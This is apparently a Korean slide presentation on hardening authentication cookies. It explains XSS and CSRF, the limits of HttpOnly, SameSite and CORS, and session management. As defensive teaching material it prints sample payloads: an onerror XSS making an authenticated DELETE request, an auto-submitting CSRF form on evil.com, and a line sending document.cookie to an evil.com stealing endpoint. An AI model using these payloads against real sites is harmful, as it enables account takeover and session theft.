— 인증 Cookie 설정 강화

발표자: join0life

01

문제

무엇이, 어떤 조건에서 일어났나

문제 · 현재 구조

팀은 "인증 보안은 충분하다"고 생각했다

서비스 구조

Frontend
https://app.example.com

Backend API
https://api.example.com

세션 쿠키

Set-Cookie: sessionId=abc123;
  HttpOnly;
  Secure;
  SameSite=None;

API 호출

fetch("https://api.example.com/api/me", {
  credentials: "include",
});
적용된 것적용되지 않은 것
HTTPS · HttpOnly · Secure · CORS(app만 허용) 입력 Sanitization · CSP · CSRF Token · Origin 검증 · 세션 관리
문제 1 · XSS

쿠키는 안 털렸는데, 사용자 권한으로 요청이 나갔다

게시글을 HTML 그대로 렌더링

<div
  dangerouslySetInnerHTML={{
    __html: post.content,
  }}
/>

공격자가 올린 게시글

<img src="invalid"
  onerror="fetch('https://api.example.com/api/profile', {
    method: 'DELETE',
    credentials: 'include'
  })" />

일어난 일

  • 다른 사용자가 게시글을 열자 공격자의 JS가 실행됨
  • document.cookie로는 sessionId를 읽지 못함 (HttpOnly)
  • 그런데 API 호출에는 브라우저가 세션 쿠키를 자동으로 붙임
  • 비밀번호 변경, 프로필 수정·삭제가 정상 처리됨
문제 2 · CSRF

외부 사이트에서 보낸 요청이 로그인한 사용자의 요청으로 처리됐다

https://evil.com 에 숨겨진 폼

<form action="https://api.example.com/api/email"
      method="POST">
  <input type="hidden" name="email"
         value="attacker@example.com" />
</form>

<script>
  document.forms[0].submit();
</script>

일어난 일

  • 로그인한 사용자가 evil.com에 접속만 함 (클릭 없음)
  • 공격자는 sessionId를 모르지만, SameSite=None이라 cross-site 요청에도 쿠키가 붙음
  • 서버는 유효한 세션만 확인하고, CSRF Token도 Origin도 검증하지 않음
  • 이메일이 공격자 주소로 변경됨
문제 3 · 팀의 오해

각 보안 옵션이 무엇을 막는지 모르고 있었다

팀이 믿고 있던 것
"HTTPS를 쓰니까 XSS·CSRF도 어느 정도 막힌다"
"HttpOnly를 쓰면 XSS가 방어된다"
"Secure는 켜 두었지만, 무엇을 막는지는 설명 못 함"
"SameSite=None을 왜 쓰는지, Lax·Strict와 뭐가 다른지 모름"
"CORS에서 app만 허용했으니 외부 사이트는 API를 호출할 수 없다"
02

판단

왜 이런 일이 가능했나

판단 1 · XSS의 원인

React의 자동 Escape를 스스로 끈 것이 원인

React가 막아주는 경우

<div>{post.content}</div>

<, >를 Escape해서 문자열로 출력 → <img onerror>도 글자로 보일 뿐

React가 막아주지 않는 경우

  • dangerouslySetInnerHTML ← 이번 케이스
  • <a href={userInput}>에 javascript: URL
  • ref로 innerHTML 직접 조작
EscapeSanitization
동작모든 HTML을 문자열로 바꿈허용한 태그만 남기고 위험한 부분을 제거
HTML 서식사라짐유지됨 (<b>, <p>)
제거 대상-<script>, onerror 등 이벤트 속성, javascript: URL
HTML을 보여줘야 한다면 Escape는 못 쓰므로 Sanitization(DOMPurify 등)이 빠져 있던 것이 문제
판단 2 · HttpOnly의 한계

HttpOnly는 쿠키를 "읽는 것"만 막는다

막는 것

// XSS 코드가 세션 ID를 훔쳐 공격자 서버로 전송
new Image().src =
  "https://evil.com/steal?c=" + document.cookie;
// → sessionId가 보이지 않음

세션 ID 탈취 방지

막지 못하는 것

// XSS 코드가 쿠키 값 없이 그냥 요청
fetch("https://api.example.com/api/profile", {
  method: "DELETE",
  credentials: "include",
});
// → 브라우저가 쿠키를 알아서 붙임

사용자 권한으로 요청 실행

쿠키가 요청에 자동으로 붙는 건 HttpOnly의 특성이 아니라 쿠키 자체의 특성. XSS 코드는 app.example.com 안에서 실행되므로 정상 프론트 코드와 똑같이 쿠키가 붙고 CORS도 통과한다.
판단 3 · Origin vs Site

app과 api는 Origin은 다르지만, Site는 같다

https://app.example.com:443/api/me
└─┬─┘   └──────┬──────┘ └┬┘└──┬──┘
scheme        host      port 경로
app . example . com
 │       │       └─ eTLD
 │       └───────── +1  → example.com
 └───────────────── 서브도메인 (Site 비교에서 무시)
구분기준app vs api
Originscheme + host + port다름 → CORS 대상
Sitescheme + eTLD+1같음 (same-site)
SameSite는 Site 기준으로 동작한다. app → api는 same-site라 Lax로 바꿔도 쿠키가 정상 전송된다. 즉 이 구조에서 SameSite=None을 쓸 이유가 없었다.
판단 4 · SameSite

SameSite는 "요청에 쿠키를 붙일지"를 정한다

값쿠키를 붙이는 요청evil.com의 form POST
Strictsame-site 요청만. 외부 링크를 타고 들어올 때도 안 붙음쿠키 안 붙음
Laxsame-site 요청 + 외부에서 링크 클릭 같은 top-level GET 이동
(생략 시 최신 브라우저 기본값)		쿠키 안 붙음
Nonecross-site 포함 모든 요청 (Secure 필수)쿠키 붙음 ← 현재
SameSite는 요청 자체를 막지 않는다. 요청은 서버까지 가지만, 쿠키가 없으니 로그인한 사용자의 요청으로 인정되지 않는다.
판단 5 · CORS의 오해

CORS Allowlist로는 CSRF를 막을 수 없다

SOP · CORS가 제한하는 것

  • SOP: 다른 출처의 응답을 읽는 것을 제한
  • CORS: 서버가 허용한 출처만 응답을 읽을 수 있게 예외를 여는 정책
  • 둘 다 요청을 보내는 것 자체는 막지 않음

그래서 CSRF가 가능했다

  • <form> POST는 CORS 검사 대상이 아님
  • 요청은 서버에 도착해서 처리됨
  • 공격자는 응답을 못 읽지만, CSRF는 보내기만 하면 성공
공격 코드가 실행되는 곳핵심
XSS우리 사이트 (app.example.com) 안같은 Origin이라 SameSite·CORS·CSRF Token 모두 통과
CSRF외부 사이트 (evil.com)응답은 못 읽고, 쿠키 자동 첨부를 악용해 보내기만 함
판단 6 · 세션 ID

이 케이스의 쿠키 값은 토큰이 아니라 세션 ID다

쿠키: sessionId=abc123   ← 랜덤 번호표

서버 세션 저장소 (메모리, Redis 등)
abc123 → { userId: 42, role: "user", ... }

서버가 사용자 정보를 들고 있는 stateful 방식

세션 ID토큰 (JWT)
정보 위치서버 저장소토큰 안
검증저장소 조회서명 검증
강제 무효화쉬움 (저장소에서 삭제)어려움
세션 ID 방식이라 재발급·만료·무효화를 서버에서 바로 제어할 수 있다 → 해결책의 세션 관리를 적용할 수 있는 근거
03

해결

인증 Cookie 설정 강화 (HttpOnly + Secure + Cookie 범위 / 세션 관리)

해결 · 이 방법의 위치

공격을 막는 게 아니라, 세션을 지키고 피해를 줄이는 계층

XSS 방어Escape · Sanitization · CSP공격이 일어나지 않게
CSRF 방어SameSite · CSRF Token · Origin 검증공격이 일어나지 않게
인증 Cookie 강화HttpOnly · Secure · 범위 · 세션 관리세션이 털리지 않게, 털려도 적게, 짧게
HTTPS / TLS · CORSHSTS · CORS Allowlist전송 구간 보호
항목막는 것현재
HttpOnlyXSS 코드의 세션 ID 탈취적용됨
SecureHTTP 평문 구간에서의 쿠키 노출적용됨
쿠키 범위필요 없는 곳으로의 쿠키 전송, 서브도메인의 쿠키 덮어쓰기SameSite=None, 제한 없음
세션 관리세션 고정 공격, 탈취된 세션의 장기 사용없음
해결 · Before / After

쿠키 한 줄이 이렇게 바뀐다

# Before
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=None

# After
Set-Cookie: __Host-sessionId=<랜덤값>; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=1800
변경효과
SameSite=None → Laxevil.com의 form POST에 쿠키가 붙지 않음 → 이번 CSRF 차단. app → api는 same-site라 영향 없음
__Host- 접두사 (Domain 생략)쿠키가 api.example.com에만 묶임. 다른 서브도메인이 같은 이름으로 덮어쓸 수 없음
Path=/__Host-의 필수 조건. 인증이 전체 API에 필요
Max-Age=1800쿠키 수명을 30분으로 제한
Strict가 아니라 Lax인 이유 — Strict는 외부 사이트에서 링크를 타고 들어올 때도 쿠키를 보내지 않아, 로그인한 사용자도 첫 화면에서 로그아웃된 것처럼 보인다.
해결 · 세션 관리

서버에서 세션의 수명을 관리한다

만료

쿠키 Max-Age + 서버 세션의 비활동 만료(idle)와 절대 만료(absolute) → 세션이 악용될 수 있는 시간을 줄임

로그인 시 세션 ID 재발급

로그인 전 세션 ID를 버리고 예측 불가능한 새 ID 발급 → 세션 고정 공격 방지

로그아웃 시 서버 세션 삭제

쿠키만 지우는 게 아니라 서버 저장소에서도 삭제해야 세션이 실제로 끊김

민감한 작업은 재인증

비밀번호·이메일 변경 시 현재 비밀번호를 다시 입력받음 → XSS 코드가 비밀번호 변경 요청을 보내도 처리되지 않음. 가장 효과가 큰 조치

해결 · 한계와 결론

인증 Cookie 강화만으로는 끝나지 않는다

남는 문제함께 필요한 계층
XSS 코드가 사용자 권한으로 요청하는 것 자체XSS 방어 (Sanitization + CSP)
같은 Site의 다른 서브도메인에서 오는 요청 (Lax로 못 막음)CSRF 방어 (CSRF Token + Origin 검증)
GET으로 상태를 바꾸는 API (Lax여도 top-level GET에는 쿠키가 붙음)상태 변경은 POST/PUT/DELETE로만
HttpOnly/Secure는 쿠키 값을 훔쳐가는 것만 막는다. 쿠키가 어디로(범위), 언제까지(수명) 쓰일 수 있는지까지 좁혀야 인증 Cookie가 강화된다. 다만 브라우저가 쿠키를 자동으로 붙이는 한, XSS 방어와 CSRF 방어가 함께 가야 한다.
